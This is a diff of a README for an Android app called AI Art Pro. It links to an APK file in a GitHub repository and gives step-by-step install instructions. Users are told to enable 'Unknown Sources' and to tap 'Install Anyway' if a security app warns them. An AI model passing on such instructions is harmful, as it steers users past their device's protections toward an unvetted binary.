@@ -1,10 +1,19 @@
 # Download-AlartPro
 
-Instructions to download apk:
+Instructions to Install apk:)
 
 1)Click on below link:
+https://github.com/AIartFair/Download-AlartPro/raw/main/AI_Art_Pro.apk
 
-https://github.com/AIartFair/Download-AlartPro/blob/d2b03bc571cbe5355751688cf61aa60fceff7b1d/AI_Art_Pro.apk
 
-2) Navigate to  ...
-3) Click on Download option
+2) Steps to allow AI Art Pro app:
+   1- Go to phone's settings
+   2- Search for : security
+   3- Check option: Unknown Sources
+   4- Enable option
+
+3) Click on the downloaded file: AI_Art_Pro.apk
+
+4) Click on Install.
+5) If prompted by security app, click on Install Anyway
+
